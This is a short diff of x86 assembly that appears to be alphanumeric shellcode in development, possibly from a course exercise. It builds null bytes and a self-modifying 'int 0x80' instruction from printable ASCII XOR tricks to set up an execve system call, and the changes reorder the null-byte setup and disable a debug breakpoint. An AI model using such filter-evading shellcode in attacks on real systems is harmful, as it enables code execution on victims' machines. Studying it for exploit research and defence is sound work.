@@ -14,8 +14,9 @@ start_listing:
     pop eax
     xor eax, 'xxxx'
 
-    ;push eax
-    ;pop ecx
+    ; Push 0-bytes for later use
+    push eax
+    push eax
 
     ; Create 0x80 in eax
     xor al, '0' ; Getting highest possible number from ascii chars (0x7F)
@@ -35,19 +36,11 @@ start_listing:
     ; We now have 0xCD and 0x80 in eax and ecx respectively
     ; We place them at the point we want them executed
 
-    int3 ; Mads, 'Construct and insert "int 0x80"'
+    ;int3 ; Mads, 'Construct and insert "int 0x80"'
     xor [edx+codelen], al
     xor [edx+codelen+1], cl
 
-    ; Create 8 nul bytes on the stack
-    push 'xxxx'
-    pop eax
-    xor eax, 'xxxx'
-
-    push eax
-    push eax
-
-    ; use them to clear ecx and edx
+    ; Use 0-bytes on stack to clear ecx and edx
     pop ecx
     pop edx
 
@@ -78,9 +71,10 @@ start_listing:
     popad
 
     ;mov eax, SYS_execve
+    ; Use 0-bytes on stack to clear ecx and edx
     push 'xxxx'
     pop eax
-    xor eax,'xxxx'
+    xor eax, 'xxxx'
     ;xor al, SYS_execve
     xor al, 'O' ; O  = 01001111
     xor al, 'D' ; D  = 01000100
